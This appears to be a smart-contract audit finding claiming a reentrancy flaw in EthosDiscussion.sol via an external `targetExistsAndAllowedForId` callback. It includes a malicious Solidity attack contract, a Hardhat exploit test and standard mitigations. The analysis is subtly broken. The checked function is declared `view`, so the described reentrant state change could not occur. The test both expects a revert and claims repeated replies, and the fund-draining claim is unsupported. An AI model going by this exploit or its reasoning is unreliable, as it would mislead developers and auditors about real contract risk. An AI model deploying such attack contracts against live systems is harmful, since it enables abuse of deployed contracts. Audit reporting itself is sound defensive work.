# Reentrancy with `targetContract` callbacks in `EthosDiscussion.sol` will open the contract to recursive calls, allowing attackers spam data, or alter the contract state in unauthorized ways

### Summary

The `EthosDiscussion` contract is vulnerable to reentrancy attacks through the unguarded external callback to the `targetContract` in the `_checkIfTargetExistsAndAllowed` function. Specifically, this function calls `targetExistsAndAllowedForId` on an external contract, which could potentially invoke malicious code. Without reentrancy protection, this opens the contract to recursive calls, allowing attackers spam data, or alter the contract state in unauthorized ways.

### Root Cause

The function `_checkIfTargetExistsAndAllowed` checks if a `targetContract` exists and allows specific activities. However, this function performs an external call to an arbitrary contract that may implement a malicious `targetExistsAndAllowedForId` function. `targetContract` has reentrancy vuln, so an attacker could exploit this to perform unauthorized actions by recursively calling `addReply` or other functions within `EthosDiscussion`.

```solidity
function _checkIfTargetExistsAndAllowed(address targetContract, uint256 targetId) private view {
    (bool exists, ) = ITargetStatus(targetContract).targetExistsAndAllowedForId(targetId);

    if (!exists) {
        revert TargetNotFound(targetContract, targetId);
    }
}
```
Here, `_checkIfTargetExistsAndAllowed` calls an external function `targetExistsAndAllowedForId` without validating the behavior of `targetContract`, leaving the contract open to reentrancy attacks if a malicious contract is used as `targetContract`.

### Impact

Without protection against reentrancy, an attacker could:
Spam the contract with excessive replies, incurring high gas costs for legitimate users.
Lock out legitimate users by exploiting the gas limit with excessive data storage, affecting the contract's functionality.


### PoC

To demonstrate this vulnerability, attacker can deploy a malicious `targetContract` that exploits reentrancy in `EthosDiscussion`. The attacker will trigger a reentrant call by continuously calling `addReply` to spam replies or drain funds if the `EthosDiscussion` contract manages any.
1. Deploy the `EthosDiscussion` contract.
2. Deploy a malicious contract with an `targetExistsAndAllowedForId` function that recursively calls `addReply` in `EthosDiscussion`.
```solidity
// MaliciousTarget.sol
pragma solidity ^0.8.0;

interface IEthosDiscussion {
    function addReply(address targetContract, uint256 targetId, string memory content, string memory metadata) external;
}

contract MaliciousTarget {
    IEthosDiscussion public ethosDiscussion;

    constructor(address _ethosDiscussion) {
        ethosDiscussion = IEthosDiscussion(_ethosDiscussion);
    }

    // Reentrancy exploit function
    function targetExistsAndAllowedForId(uint256 targetId) external returns (bool, bool) {
        ethosDiscussion.addReply(address(this), targetId, "Exploit", "Exploit Metadata");
        return (true, true); // Bypass the existence check
    }
}
```
Test on HH:
```javascript
// Hardhat Exploit Test
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("EthosDiscussion Reentrancy PoC", function () {
    let discussion, attacker, maliciousContract, deployer;

    before(async () => {
        [deployer, attacker] = await ethers.getSigners();
        const Discussion = await ethers.getContractFactory("EthosDiscussion");
        discussion = await Discussion.deploy();

        const MaliciousTarget = await ethers.getContractFactory("MaliciousTarget");
        maliciousContract = await MaliciousTarget.deploy(discussion.address);
    });

    it("should exploit reentrancy in addReply via malicious targetContract", async function () {
        // Attacker adds a reply to trigger the reentrancy exploit
        await expect(
            discussion.connect(attacker).addReply(
                maliciousContract.address,
                1,
                "Exploit Content",
                "Exploit Metadata"
            )
        ).to.be.revertedWith("Reentrancy Detected");

        // Check replyCount to see if multiple replies were added inappropriately
        const finalReplyCount = await discussion.replyCount();
        console.log("Final reply count:", finalReplyCount);
    });
});
```
4. Output: running the exploit test without proper reentrancy protection show that the `replyCount` has incremented multiple times. With effective reentrancy guards, the test should revert with an error, such as "Reentrancy Detected".

### Mitigation

1. Add the `nonReentrant` modifier (from OpenZeppelinâ€™s ReentrancyGuard) to functions that interact with external contracts.
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract EthosDiscussion is ReentrancyGuard {
    // ...

    function addReply(
        address targetContract,
        uint256 targetId,
        string memory content,
        string memory metadata
    ) external nonReentrant onlyNonZeroAddress(targetContract) whenNotPaused {
        // Implementation
    }
}
```
2. Ensure that only trusted `targetContract` addresses are allowed by maintaining an allowlist.
3. Limit or avoid calls to external contracts in critical functions like `addReply`, instead deferring any state-sensitive external calls to separate functions where possible.
